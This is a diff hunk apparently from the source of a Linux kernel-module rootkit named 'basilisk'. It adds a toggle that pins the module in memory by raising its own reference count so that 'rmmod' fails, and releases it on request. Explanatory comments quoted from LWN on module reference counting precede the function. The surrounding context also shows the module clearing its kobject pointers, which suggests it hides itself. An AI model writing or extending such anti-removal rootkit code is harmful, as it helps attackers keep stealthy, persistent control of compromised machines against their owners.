@@ -217,3 +217,36 @@ err_attrs:
         lkm.this_mod->mkobj.mp = NULL;
     }
 }
+
+/*
+"Dynamically-inserted kernel modules are reference-counted, so that a
+call to "rmmod" will fail if the reference-count is not zero, i.e if the
+module is still in use.
+
+Function module_get increments the reference count of a module; once
+this has returned success then the calling code can rely on the
+specified module *not* being unloaded. When the caller no longer needs
+that module, then module_put must be called to decrement the reference
+count." - https://t.ly/lF0S3
+
+From https://lwn.net/Articles/22197/:
+ Any code which wishes to call into a module (or use some other module resource) must first attempt to increment that module's reference count:
+
+    int try_module_get(&module);
+
+It is also necessary to look at the return value from try_module_get(); 
+a zero return means that the try failed, and the module should not be used. 
+Failure can happen, for example, when the module is in the process of being unloaded.
+
+A reference to a module can be released with module_put().
+*/
+void handle_lkm_protect(short *protected) {
+    if (!(*protected)) {
+        pr_info("basilisk: protecting kernel module\n");
+        try_module_get(lkm.this_mod);
+    } else {
+        pr_info("basilisk: un-protecting kernel module\n");
+        module_put(lkm.this_mod);
+    }
+    *protected = !(*protected);
+}
